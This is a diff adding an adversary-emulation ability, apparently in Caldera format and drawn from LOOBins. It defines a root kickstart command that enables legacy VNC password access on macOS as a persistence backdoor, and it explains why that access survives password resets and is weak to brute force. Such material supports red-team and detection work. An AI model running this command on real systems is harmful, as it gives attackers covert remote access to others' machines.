@@ -1,0 +1,45 @@
+- id: 5800175e-f8fa-97ea-6c5a-a93deba568f2
+  name: kickstart - Enable legacy VNC authentication with an attacker-chosen password
+  description: '-configure -clientopts -setvnclegacy -vnclegacy yes -setvncpw -vncpw <PASSWORD> turns
+    on legacy VNC password mode
+
+    and stores the password in /Library/Preferences/com.apple.VNCSettings.txt. This authentication path
+    does not depend
+
+    on any macOS account password, so it survives a password reset and is reachable from any standard
+    VNC client.
+
+    kickstart obfuscates the stored password with a fixed XOR key, so the file is trivially reversible
+    by anyone who can
+
+    read it, and the service truncates the password to 8 characters with no rate limiting, making brute
+    force practical.
+
+    Requires root.
+
+    '
+  tactic: persistence
+  technique:
+    attack_id: T1543.001
+    name: 'Create or Modify System Process: Launch Agent'
+  platforms:
+    darwin:
+      sh:
+        command: sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart
+          -configure -clientopts -setvnclegacy -vnclegacy yes -setvncpw -vncpw <PASSWORD>
+  singleton: true
+  privilege: Elevated
+  repeatable: false
+  delete_payload: false
+  buckets:
+  - loobins
+  - kickstart
+  - persistence
+  version: '1.0'
+  author: LOOBins Project
+  additional_info:
+    loobins_tool: kickstart
+    use_case: Enable legacy VNC authentication with an attacker-chosen password
+    source_file: kickstart.yml
+    source_repository: https://github.com/infosecB/LOOBins
+    import_timestamp: '2026-10-12T08:33:56.369655Z'
